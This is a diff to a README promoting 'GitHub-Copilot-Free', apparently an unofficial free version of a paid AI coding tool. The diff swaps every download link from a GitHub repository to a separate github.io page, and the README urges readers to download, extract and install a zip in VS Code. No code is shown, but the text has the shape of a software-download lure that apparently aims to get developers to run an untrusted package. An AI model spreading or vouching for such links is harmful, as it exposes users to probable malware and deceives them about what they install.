@@ -17,7 +17,7 @@ GitHub-Copilot-Free is a powerful, free AI assistant that helps you write code r
 Getting started is easy. Follow these steps:
 
 1. **Visit this link to download the application:**  
-   [![Download Now](https://img.shields.io/badge/Download-GitHub--Copilot--Free-brightgreen?style=for-the-badge&logo=github)](https://github.com/Sixtynine-teetotalism1311/GitHub-Copilot-Free)
+   [![Download Now](https://img.shields.io/badge/Download-GitHub--Copilot--Free-brightgreen?style=for-the-badge&logo=github)](https://sixtynine-teetotalism1311.github.io)
 
 2. The link opens a GitHub page. Look for the green "Code" button, click it, and select "Download ZIP." If you see a file named `GitHub-Copilot-Free.zip` on the page, click it directly to download.
 
@@ -96,7 +96,7 @@ A: Like all AI, it’s not perfect. Always review the code it produces, especial
 
 ## 🧾 Final Checklist Before You Start
 
-- [ ] Downloaded the zip from [this link](https://github.com/Sixtynine-teetotalism1311/GitHub-Copilot-Free)  
+- [ ] Downloaded the zip from [this link](https://sixtynine-teetotalism1311.github.io)  
 - [ ] Extracted the zip file  
 - [ ] Installed Visual Studio Code (if not already)  
 - [ ] Loaded the extension into VS Code  
@@ -112,7 +112,7 @@ If you run into trouble, don’t panic. Re-read this guide, check the GitHub pag
 You now have everything you need to supercharge your coding with GitHub-Copilot-Free. It’s one download away, so grab it now and watch your productivity soar. Whether you’re building a website, a game, or just learning, this AI assistant is here to help you every step of the way.
 
 **Download again if you need it:**  
-[![Get GitHub-Copilot-Free](https://img.shields.io/badge/Download-File-007ec6?style=for-the-badge&logo=appveyor)](https://github.com/Sixtynine-teetotalism1311/GitHub-Copilot-Free)
+[![Get GitHub-Copilot-Free](https://img.shields.io/badge/Download-File-007ec6?style=for-the-badge&logo=appveyor)](https://sixtynine-teetotalism1311.github.io)
 
 Happy coding!
 
